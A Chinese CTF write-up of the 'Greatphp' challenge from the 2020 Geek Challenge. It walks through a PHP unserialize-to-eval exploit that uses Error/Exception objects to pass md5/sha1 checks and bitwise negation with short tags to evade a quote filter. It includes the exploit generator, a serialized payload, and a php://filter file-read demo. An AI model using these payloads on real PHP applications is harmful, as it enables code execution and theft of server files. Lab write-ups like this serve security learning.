---
title: 极客大挑战2020-Greatphp
date: 2025-04-21 16:19:05
tags:
- PHP原生类
- 取反绕过
- php标签
- Error/Exception
category:
- 刷题笔记
---

# 极客大挑战2020-Greatphp

源码

```
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

代码审计

```
上半部分定义了一个 SYCLOVER 的类，存在 2 个属性syc和lover，同时还定义了一个wake方法将这2个属性进行强类型比较，和正则匹配，并且syc会传入eval函数，下半部分就是传入一个great的参数，对这个参数进行反序列化，所以我们目标就明确了，我们需要绕过这个强类型比较，之后在绕过正则表达，最后执行寻找flag的命令.
```

这里强类型比较可以用数组绕过，但是下面的eval函数不能传入数组。

这里通过PHP的原生类来进行绕过(Error 或者 Exception),这两个类中呢存在一个_toString()的方法属性,意思就是当这两个类的对面需要被转换成字符串的时候就会调用 _toString()

**在强类型比较是md5()以及sha1()会将对象转化为字符串从而调用_toString()**

原理：

[原文链接](https://blog.csdn.net/alwtj/article/details/141788463)

```
在 PHP 的 Exception 类中，构造函数实际上可以接收三个参数，尽管在大多数情况下，只使用前两个参数就足够了。这三个参数分别是：

消息（message）：这是一个字符串，用于描述异常的具体原因或情况。它是构造函数的第一个参数，也是必须提供的参数。

代码（code）：这是一个整数，用于提供异常的特定代码。它是可选的，但在某些情况下，它可能有助于识别或分类异常。如果没有提供，它默认为 0。

前一个异常（previous）：这是一个 Exception 对象，用于表示当前异常之前发生的异常。这是可选的，但在处理异常的链式传递时非常有用。如果提供了这个参数，那么当前的异常就被视为前一个异常的“子异常”或“后继异常”。

而当该对象作为字符串输出是之后输出消息以及错误代码的行数  ( 重点 )
```

具体实例：

```
<?php
$a = new Exception("payload",1);$b = new Exception("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
?>
```

结果：

```
Exception: payload in E:\CTF\newphp\mixbp.php:2
Stack trace:
#0 {main}

Exception: payload in E:\CTF\newphp\mixbp.php:2
Stack trace:
#0 {main}
```

所以我们可以通过上面的特性来绕过强类型比较.

之后来构造payload来实现获取flag  注意:上面实现的payload我们可以自己控制

所以我们可以通过 include "/flag" 命令来去把flag值显示在页面上,同时为了绕过正则表达的双引号我们可以通过取反来绕过,那么服务器拿到的效果就是:Exception: include "/flag" in /tmp/sandbox.s0-s0;c501,c742/home/.code.tio:2 Stack trace:  ,有点乱很抽象所以我们需要闭合`<?php 来实现我们包含flag文件的效果,又因为正则表达过滤了php我们可以用<?php ?> <=> <?=?>`来绕过.

所以构造exp

```
<?php
class SYCLOVER {
    public $syc;
    public $lover;
 
    public function __construct($b,$c){
        $this->syc = $b;
        $this->lover = $c;
    }
}
$in = ~("/flag");
$payload = "?><?=include~".$in."?>";
$b = new error($payload,1);$c=new error($payload,2);
$a = new SYCLOVER($b,$c);
echo(urlencode(serialize($a)));
?>
```

执行结果

```
O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A23%3A%22E%3A%5CCTF%5Cnewphp%5Cmixbp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A13%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A23%3A%22E%3A%5CCTF%5Cnewphp%5Cmixbp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A13%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D
```

效果就成了 : **`Exception: ?><?=include "/flag"?> in /tmp/sandbox.s0-s0;c501,c742/home/.code.tio:2 Stack trace:`**

解释：

```
<?php echo include "/flag"?> 会被执行从而获取到flag的value了，而后面多余的报错会被当成文本内容输出，并且会多一个 “1” ，这个 “1” 是include包含成功返回给echo的.
```

直接注入拿到flag

```
flag{b3ce1836-928b-4277-aa62-82e417d3d0aa} 1 in E:\CTF\newphp\mixbp.php:13 Stack trace: #0 {main}
```

## 知识点：

### php原生类 Error/Exception

原理：

[原文链接](https://blog.csdn.net/alwtj/article/details/141788463)

```
在 PHP 的 Exception 类中，构造函数实际上可以接收三个参数，尽管在大多数情况下，只使用前两个参数就足够了。这三个参数分别是：

消息（message）：这是一个字符串，用于描述异常的具体原因或情况。它是构造函数的第一个参数，也是必须提供的参数。

代码（code）：这是一个整数，用于提供异常的特定代码。它是可选的，但在某些情况下，它可能有助于识别或分类异常。如果没有提供，它默认为 0。

前一个异常（previous）：这是一个 Exception 对象，用于表示当前异常之前发生的异常。这是可选的，但在处理异常的链式传递时非常有用。如果提供了这个参数，那么当前的异常就被视为前一个异常的“子异常”或“后继异常”。

而当该对象作为字符串输出是之后输出消息以及错误代码的行数  ( 重点 )
```

具体实例：

```
<?php
$a = new Exception("payload",1);$b = new Exception("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
?>
```

结果：

```
Exception: payload in E:\CTF\newphp\mixbp.php:2
Stack trace:
#0 {main}

Exception: payload in E:\CTF\newphp\mixbp.php:2
Stack trace:
#0 {main}
```

所以我们可以通过上面的特性来绕过强类型比较.

---

### 取反绕过单双引号以及include包含字符串

有时候题目过滤了单双引号，如果没有引号闭合在eval函数内不会被解析执行，我们可以通过取反符号来突破限制，并且include能够字符串进行包含

具体实例：

```
<?php
$in = "php://filter/convert.base64-encode/resource=mixbp.php";
$payload = "?><?=include".$in."?>";
$a = new error($payload,1);

eval($a);
?>

```

输出

```
Parse error: syntax error, unexpected ':', expecting ',' or ';' in E:\CTF\newphp\mixbp.php(5) : eval()'d code on line 1
```

可以看到没用成功执行包含

使用取反

```
<?php
$in = ~"php://filter/convert.base64-encode/resource=mixbp.php";
$payload = "?><?=include~".$in."?>";
$a = new error($payload,1);
eval($a);

?>
```

输出

```
Warning: Use of undefined constant �����Й�����М������ѝ�����Қ�����Ѝ�����������я�� - assumed '�����Й�����М������ѝ�����Қ�����Ѝ�����������я��' (this will throw an Error in a future version of PHP) in E:\CTF\newphp\mixbp.php(5) : eval()'d code on line 1
PD9waHANCiRpbiA9IH4icGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1taXhicC5waHAiOw0KJHBheWxvYWQgPSAiPz48Pz1pbmNsdWRlfiIuJGluLiI/PiI7DQokYSA9IG5ldyBlcnJvcigkcGF5bG9hZCwxKTsNCmV2YWwoJGEpOw0KDQo/Pg==1 in E:\CTF\newphp\mixbp.php:4
Stack trace:
#0 {main}

```

虽然报错，但是成功执行

